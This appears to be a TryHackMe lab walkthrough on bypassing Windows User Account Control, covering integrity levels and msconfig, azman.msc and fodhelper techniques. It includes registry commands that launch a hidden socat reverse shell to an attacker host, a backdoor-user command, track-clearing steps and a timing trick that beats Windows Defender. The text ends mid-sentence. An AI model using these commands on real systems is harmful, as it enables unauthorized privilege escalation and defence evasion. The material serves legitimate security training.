{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/9c8359d213941312199b6142d3421a57.png', 'title': 'Bypassing UAC', 'description': 'Learn common ways to bypass User Account Control (UAC) in Windows hosts.', 'code': 'bypassinguac', 'users': 11968, 'tags': ['UAC', 'evasion', 'windows', 'red team', 'privesc'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 475, 'created': '2022-02-07T22:03:59.231Z', 'published': '2022-03-29T18:00:14.987Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/790b5bc214f0a2223074c2c69a71e908.png', 'creator': 'munra', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p>In this room, we will be looking at common ways to bypass a security feature available to Windows systems known as\xa0<strong>User Account Control (UAC).</strong>\xa0This feature allows for any process to be run with low privileges independent of who runs it (either a regular user or an admin).</p>\n<p>From an attacker\'s perspective, bypassing UAC is essential to breaking out of highly restrictive environments and fully elevating privileges on target hosts. While learning the bypass techniques, we will also look at any alerts that could be triggered and artefacts that may be created on the target system that the blue team could detect.</p>\n<h3>Room objectives</h3>\n<ul>\n<li>Learn the different techniques available to attackers to bypass UAC.</li>\n</ul>\n<h3>Room prerequisites</h3>\n<p>It is recommended to go through the <a href="https://tryhackme.com/room/windowsinternals" target="_blank">Windows Internals</a> room before this one.</p>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2022-02-22T14:48:14.589Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Click and continue learning!', 'hint': ''}]}, {'taskTitle': 'User Account Control (UAC)', 'taskDesc': '<h3>What is UAC?</h3>\n<p><img style="float:right" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c9e08e46fb545bd16f1c648e2956a34.png" class="note-float-right" />User Account Control (UAC) is a Windows security feature that forces any new process to run in the security context of a non-privileged account by default. This policy applies to processes started by any user, including administrators themselves. The idea is that we can\'t solely rely on the user\'s identity to determine if some actions should be authorized.</p>\n<p>Although this may seem counterintuitive, imagine the case where user BOB unknowingly downloads a malicious application from the Internet. If BOB is a part of the Administrators group, any application he launches will inherit its access token privileges. So if BOB decides to launch the malicious application and UAC is disabled, the malicious application would gain administrator privileges instantly. Instead, the malicious application will be restricted to a non-administrative access token when UAC is enabled.</p><p><br /></p>\n<h3>UAC Elevation</h3>\n<p>If an administrator is required to perform a privileged task, UAC provides a way to elevate privileges. <b>Elevation</b> works by presenting a simple dialogue box to the user to confirm that they explicitly approve running the application in an administrative security context:</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8088062c5a8e61407d343186bba02596.png" /></p><p style="text-align:center"><br /></p>\n\n<h3>Integrity Levels</h3>\n<p>UAC is a <strong>Mandatory Integrity Control (MIC)</strong>, which is a mechanism that allows differentiating users, processes and resources by assigning an <strong>Integrity Level (IL)</strong> to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resource according to the DACL, but it won\'t matter if your IL isn\'t high enough.</p>\n<p><span style="font-size:1rem">The following 4 ILs are used by Windows, ordered from lowest to highest:</span><br /></p><table class="table table-bordered"><tbody><tr><td style="text-align:left"><b>Integrity Level</b></td><td style="text-align:left"><b>Use</b></td></tr><tr><td style="text-align:left">Low</td><td style="text-align:left">Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.<br /></td></tr><tr><td style="text-align:left">Medium</td><td style="text-align:left">Assigned to standard users and Administrators\' filtered tokens.<br /></td></tr><tr><td style="text-align:left">High</td><td style="text-align:left">Used by Administrators\' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.<br /></td></tr><tr><td style="text-align:left">System</td><td style="text-align:left">Reserved for system use.</td></tr></tbody></table><p>When a process requires to access a resource, it will inherit the calling user\'s access token and its associated IL. The same occurs if a process forks a child.</p><p><br /></p>\n\n<h3>Filtered Tokens</h3>\n<p>To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:</p>\n<ul>\n<li><strong>Non-administrators</strong> will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.</li>\n<li><strong>Administrators</strong> will receive two access tokens:\n<ul>\n<li><strong>Filtered Token:</strong> A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.</li>\n<li><strong>Elevated Token:</strong> A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.</li>\n</ul>\n</li>\n</ul>\n<p>In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.</p><p><br /></p>\n\n<h3>Opening an Application the Usual Way</h3>\n<p>When trying to open a regular console, we can either open it as a non-privileged user or as an administrator. Depending on our choice, either a Medium or High integrity level token will be assigned to the spawned process:</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/85532945ffd962373592d21f1720ee39.png" style="width:75%" /><br /></p>\n<p>If we analyze both processes using Process Hacker, we can see the associated tokens and their differences :</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/605235aa87c2f39689d0396bb3603967.png" /></p><p>On the left, you have a filtered token with medium IL and almost no privileges assigned. On the right, you can see that the process runs with high IL and has many more privileges available. Another difference that may not be so obvious is that the medium IL process is effectively denied any privileges related to being part of the Administrators group.</p><p><br /></p><h3>UAC Settings</h3><p>Depending on our security requirements, UAC can be configured to run at four different notification levels:</p><ul><li><b>Always notify:</b> Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.</li><li><b>Notify me only when programs try to make changes to my computer:</b> Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won\'t be prompted when changing Windows settings.</li><li><b>Notify me only when programs try to make changes to my computer (do not dim my desktop): </b>Same as above, but won\'t run the UAC prompt on a secure desktop.<br /></li><li><b>Never notify:</b> Disable UAC prompt. Administrators will run everything using a high privilege token.</li></ul><p>By default, UAC is configured on the\xa0<b>Notify me only when programs try to make changes to my computer</b> level:</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/143a6c0fd6725edaee0f3d5c707e97f0.png" /></p><p style="text-align:left">From an attacker\'s perspective, the three lower security levels are equivalent, and only the Always notify setting presents a difference.</p><p style="text-align:left"><br /></p>\n\n<h3>UAC Internals</h3>\n<p>At the heart of UAC, we have the <strong>Application Information Service</strong> or <strong>Appinfo</strong>. Whenever a user requires elevation, the following occurs: </p>\n<ol>\n<li>The user requests to run an application as administrator.</li>\n<li>A <strong>ShellExecute</strong> API call is made using the <strong>runas</strong> verb. </li>\n<li>The request gets forwarded to Appinfo to handle elevation.</li><li>The application manifest is checked to see if AutoElevation is allowed (more on this later).</li>\n<li>Appinfo executes <strong>consent.exe</strong>, which shows the UAC prompt on a <strong>secure desktop</strong>. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user\'s desktop to avoid other processes from tampering with the UAC prompt in any way.</li>\n<li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:decimal"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user\'s Elevated Token. Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.</span></li></ol><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fce906f0e438efa938753430e5d25afe.png" /><br /></p><p style="text-align:center"><br /></p>\n\n<h3>Bypassing UAC</h3>\n<p>From an attacker\'s perspective, there might be situations where you get a remote shell to a Windows host via Powershell or cmd.exe. You might even gain access through an account that is part of the Administrators group, but when you try creating a backdoor user for future access, you get the following error:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Powershell\n        </div>\n        <pre class="terminal-code">            <code class="language-shell-session">PS C:\\Users\\attacker&gt; net user backdoor Backd00r /add\nSystem error 5 has occurred.\n\nAccess is denied.</code>\n        </pre>\n    </div>\n</div>\n<p><span style="font-size:1rem">By checking our assigned groups, we can confirm that our session is running with a medium IL, meaning we are effectively using a filtered token:\xa0</span><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Powershell\n        </div>\n        <pre class="terminal-code">            <code class="language-shell-session">PS C:\\Users\\attacker&gt; whoami /groups\n\t\nGROUP INFORMATION\n-----------------\n\nGroup Name                                                    Attributes\n============================================================= ==================================================\nEveryone                                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account and member of Administrators group Group used for deny only\nBUILTIN\\Administrators                                        Group used for deny only\nBUILTIN\\Users                                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users                              Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization                                Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account                                    Mandatory group, Enabled by default, Enabled group\nLOCAL                                                         Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level</code>\n        </pre>\n    </div>\n</div>\n<p><span style="font-size:1rem">Even when we get a Powershell session with an administrative user, UAC prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control of our target, we must bypass UAC.</span><br /></p>\n<p>Interestingly enough, Microsoft doesn\'t consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense, the UAC prompt is more of a reminder to the user that they are running with high privileges rather than impeding a piece of malware or an attacker from doing so. Since it isn\'t a security boundary, any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.</p>\n<p>Generally speaking, most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt. </p>\n<p>For all the scenarios presented in this room, we assume we have access to the server with an administrative account but from a Medium IL console only. Our goal will always be to access a High IL console without going through UAC.</p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2022-02-23T02:25:19.531Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<div>What is the highest integrity level (IL) available on Windows?</div>', 'hint': ''}, {'questionNo': 2, 'question': "<p>What is the IL associated with an administrator's elevated token?</p>", 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the full name of the service in charge of dealing with UAC elevation requests?</p>', 'hint': ''}]}, {'taskTitle': 'UAC: GUI based bypasses', 'taskDesc': '<p>We will start by looking at GUI-based bypasses, as they provide an easy way to understand the basic concepts involved. These examples are not usually applicable to real-world scenarios, as they rely on us having access to a graphical session, from where we could use the standard UAC to elevate.</p><p>Click the Start Machine button to deploy your VM and connect to it via RDP or in the side by side view in Browser:</p><p style="text-align:left"><code>xfreerdp /v:MACHINE_IP /u:attacker /p:Password321</code></p><p style="text-align:left">This machine will be used for all tasks in the room.</p><p style="text-align:left"><br /></p>\n<h3>Case study: msconfig</h3>\n<p>Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let\'s start by opening msconfig, either from the start menu or the "Run" dialog:<br /></p><div style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/30570f96439f9de572fe97ba508ccdfa.png" /><img style="font-size:1rem" /></div><p></p>\n<p>If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:</p>\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png" /><br /></p>\n<p>This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user\'s interaction. More details on this later.</p>\n<p>If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:</p>\n<p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/efbc49a8c7acfe3f296d0cb46cd2f75a.png" /><br /></p>\n<p>If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.</p>\n<p>To retrieve the msconfig flag, use the obtained high integrity console to execute:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Administrator: Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; C:\\flags\\GetFlag-msconfig.exe</code>\n</pre><pre class="terminal-code"><br /></pre><p><span style="font-size:1.75rem">Case study: azman.msc</span><br /></p></div></div>\n<p>As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.</p>\n<p>First, let\'s run azman.msc:</p>\n<p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/769ef59be8fc62884e69a0b39422b2a5.png" /><br /></p>\n<p>We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2fd110f80a236ea5bbb06518b519b440.png" /><br /></p>\n<p>To run a shell, we will abuse the application\'s help:</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2f1aef0aa39ffcf9056999c939e43b8d.png" /><br /></p>\n<p>On the help screen, we will right-click any part of the help article and select <strong>View Source</strong>:</p>\n<p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e3967d4cdb4c30dc46e7ce81eb2825.png" /><br /></p>\n<p>This will spawn a notepad process that we can leverage to get a shell. To do so, go to <strong>File-&gt;Open</strong> and make sure to select <strong>All Files</strong> in the combo box on the lower right corner. Go to <code>C:\\Windows\\System32</code><strong></strong> and search for <code>cmd.exe</code><strong></strong> and right-click to select Open:</p>\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ae24b569d5d95119e79feb425e1b7ff.png" /><br /></p>\n<p>This will once again bypass UAC and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:</p>\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7fb637209e08c712615b992b9d0533ca.png" /><br /></p>\n<p>To retrieve the azman flag, use the obtained high integrity console to execute:</p>\n\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Administrator: Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; C:\\flags\\GetFlag-azman.exe</code>\n        </pre>\n    </div>\n</div>', 'taskType': 'vm', 'taskNo': 3, 'taskCreated': '2022-02-23T02:25:21.694Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '62448abced1b240049596517', 'questions': [{'questionNo': 1, 'question': 'What flag is returned by running the msconfig exploit?', 'hint': ''}, {'questionNo': 2, 'question': '<p>What flag is returned by running the azman.msc exploit?<br /></p>', 'hint': ''}]}, {'taskTitle': 'UAC: Auto-Elevating Processes', 'taskDesc': '<h3>AutoElevate</h3>\n<p>As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel\'s functionality and some executables provided with Windows.</p>\n<p>For an application, some requirements need to be met to auto-elevate:</p>\n<ul>\n<li>The executable must be signed by the Windows Publisher</li>\n<li>The executable must be contained in a trusted directory, like <code>%SystemRoot%/System32/</code><strong></strong> or <code>%ProgramFiles%/</code><strong></strong></li>\n</ul>\n<p>Depending on the type of application, additional requirements may apply:</p>\n<ul>\n<li>Executable files (.exe) must declare the <b>autoElevate</b> element inside their manifests. To check a file\'s manifest, we can use <strong><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck" target="_blank">sigcheck</a></strong>, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on <code>C:\\tools\\</code>\xa0. If we check the manifest for msconfig.exe, we will find the autoElevate property:</li>\n</ul>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\tools\\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe\n...\n&lt;asmv3:application&gt;\n\t&lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;\n\t\t&lt;dpiAware&gt;true&lt;/dpiAware&gt;\n\t\t&lt;autoElevate&gt;true&lt;/autoElevate&gt;\n\t&lt;/asmv3:windowsSettings&gt;\n&lt;/asmv3:application&gt;</code>\n        </pre>\n    </div>\n</div>\n<ul>\n<li>mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.</li>\n<li>Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.</li>\n<li>COM objects can also request auto-elevation by configuring some registry keys (<a class="external-link" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker" target="_blank">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker</a>).</li></ul><p><br /></p><ul>\n</ul>\n<h3>Case study: Fodhelper</h3>\n<p>Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won\'t be prompted for elevation when performing standard administrative tasks. While we\'ve already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.<br /></p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/705cefc6711f050b45a6f1af4019a679.png" /><br /></p><p>From an attacker\'s perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by <a class="external-link" href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank">@winscripting</a> and has been used in the wild by the <a class="external-link" href="https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit" target="_blank">Glupteba malware</a>.</p>\n<p>What was noticed about fodhelper is that it searches the registry for a specific key of interest:</p>\n<p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb7ac876cd05f51495f9882fa00ef832.png" /><br /></p>\n<p>When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (<b>ProgID</b>) for each filetype, where the corresponding application is associated. Let\'s say you try to open an HTML file. A part of the registry known as the <strong>HKEY_CLASSES_ROOT</strong> will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the <code>shell/open/command</code><strong></strong> subkey for each file\'s ProgID. Taking the "htmlfile" ProgID as an example:</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2428d786ec68d8731dc98b6598211eb9.png" /><br /></p>\n<p>In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry:</p><table class="table table-bordered"><tbody><tr><td style="text-align:left"><b>Path</b></td><td style="text-align:left"><b>Description</b></td></tr><tr><td style="text-align:left">HKEY_LOCAL_MACHINE\\Software\\Classes<br /></td><td style="text-align:left">System-wide file associations</td></tr><tr><td style="text-align:left">HKEY_CURRENT_USER\\Software\\Classes<br /></td><td style="text-align:left">Active user\'s file associations</td></tr></tbody></table><p><span style="font-size:1rem">When checking HKEY_CLASSES_ROOT, if there is a user-specific association at </span><strong>HKEY_CURRENT_USER (HKCU)</strong><span style="font-size:1rem">, it will take priority. If no user-specific association is configured, then the system-wide association at </span><strong>HKEY_LOCAL_MACHINE (HKLM)</strong><span style="font-size:1rem"> will be used instead.\xa0</span>This way, each user can choose their preferred applications separately if desired.<br /></p>\n<p>Going back to fodhelper, we now see that it\'s trying to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user\'s context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.<br /></p><p><br /></p>\n<h3>Putting it all together</h3>\n<p>One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.</p>\n<p>To connect to the backdoor, you can use the following command:</p><pre style="font-size:14px"><code>nc MACHINE_IP 9999</code></pre>\n<p>Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Attacker\'s Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">user@kali$ nc MACHINE_IP 9999\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nmyserver\\attacker\n\nC:\\Windows\\system32&gt;net user attacker | find "Local Group"\nLocal Group Memberships      *Administrators       *Users                \n\nC:\\Windows\\system32&gt;whoami /groups | find "Label"\nMandatory Label\\Medium Mandatory Level                        Label            S-1-16-8192</code>\n        </pre>\n    </div>\n</div>\n<p>We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of <strong>socat</strong> can be found on <code>c:\\tools\\socat\\</code><strong></strong>. You can use the following commands to set the required registry keys from a standard command line:</p>\n\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nC:\\&gt; set CMD="powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"\n\nC:\\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f\nThe operation completed successfully.\n\nC:\\&gt; reg add %REG_KEY% /d %CMD% /f\nThe operation completed successfully.</code>\n        </pre>\n    </div>\n</div>\n\n<p>Notice how we need to create an empty value called <strong>DelegateExecute</strong> for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.</p>\n<p>We set up a listener by using netcat in our machine:</p><p><code>nc -lvp 4444</code><br /></p>\n<p>And then proceed to execute <strong>fodhelper.exe</strong>, which in turn will trigger the execution of our reverse shell:<br /></p>\n<table><tbody><tr>\n<td style="width:45%">\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; fodhelper.exe\n\n\n\n\n\n\n\n\n</code>\n        </pre>\n    </div>\n</div>\n</td>\n<td><span style="font-size:64px">➜</span></td>\n<td style="width:45%">\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Attacker\'s Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">user@kali$ nc -lvp 4444      \nListening on 0.0.0.0 4444\nConnection received on 10.10.183.127 49813\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami /groups | find "Label"\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288</code>\n        </pre>\n    </div>\n</div>\n</td>\n</tr></tbody></table>\n<p>The received shell runs with high integrity, indicating we have successfully bypassed UAC.</p><p><span style="font-size:1rem">To retrieve the fodhelper flag, use your new shell to execute:</span><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Administrator: Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; C:\\flags\\GetFlag-fodhelper.exe</code>\n        </pre>\n    </div>\n</div>\n<p><b>Note: Keep in mind that the flag will only be returned if you successfully\xa0bypassed UAC via fodhelper and only from the resulting high integrity shell.</b></p><p><br /></p>\n<h3>Clearing our tracks</h3>\n<p>As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>\n<pre><code class="language-batch">reg delete HKCU\\Software\\Classes\\ms-settings\\ /f</code></pre>\n<p><b>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks.</b></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2022-02-23T02:25:22.747Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What flag is returned by running the fodhelper exploit?', 'hint': ''}]}, {'taskTitle': 'UAC: Improving the Fodhelper Exploit to Bypass Windows Defender', 'taskDesc': '<h3><span style="font-size:1.75rem">Windows Defender</span><br /></h3>\n<p>For simplicity, the machine we are targeting has Windows Defender disabled. But what would happen if it was enabled?</p>\n<p>First, using your GUI connection, go to your desktop and double-click the following icon to enable Windows Defender:<br /></p><div style="text-align:center"><img style="font-size:1rem" /><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a138ccd399c27bb922efcc266053c3a3.png" /></div><p></p>\n<p>Now try exploiting fodhelper again through the backdoor connection and see what happens on the server\'s GUI. Just as you change the <code>(default)</code><strong></strong> value in <code>HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command</code><strong></strong> to insert your reverse shell command, a Windows Defender notification will pop up:</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ebebccbac675f6b66f98a16446d1859.png" /><br /></p>\n<p>By clicking the notification, we can check the details on the alert, which mention a UAC bypass attempt by modifying a registry value:</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8faadca4b214e13d32a6e7979554dcdc.png" /><span style="font-size:1rem"><br /></span></p><p><span style="font-size:1rem">If you query the corresponding value on the registry, you will notice it has been erased:</span></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\Windows\\system32&gt;reg query %REG_KEY% /v ""\n\nHKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\n    (Default)    REG_SZ    (value not set)</code>\n        </pre>\n    </div>\n</div>\n<p><span style="font-size:1rem">Although by now it would seem our exploit wouldn\'t work with Windows Defender enabled, check what happens if you run the same commands but with a slight modification (be sure to replace your IP address where needed):</span><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nC:\\&gt; set CMD="powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"\n\nC:\\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f\nThe operation completed successfully.\n\nC:\\&gt; reg add %REG_KEY% /d %CMD% /f &amp; reg query %REG_KEY%\nHKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\n    DelegateExecute    REG_SZ    \n    (Default)    REG_SZ    powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes</code>\n        </pre>\n    </div>\n</div>\n\n<p>We have added a quick query to the offending registry value right after setting it to the command required for our reverse shell. Surprisingly, the query outputs our command intact.\xa0<span style="font-size:1rem">We still get alerted by Windows Defender, and a second later, the offending registry value gets deleted as expected. It appears it takes a moment for Windows Defender to take action on our exploit, so let\'s set a reverse listener on our attacker\'s machine:</span></p>\n<pre><code>nc -lvp 4444</code></pre>\n<p>And modify the exploit to run fodhelper.exe immediately after setting the registry value. If the command runs quick enough, it will just work\xa0<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nC:\\&gt; set CMD="powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"\n\nC:\\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f\nThe operation completed successfully.\n\nC:\\&gt; reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe</code>\n        </pre>\n    </div>\n</div>\n\n<p><span 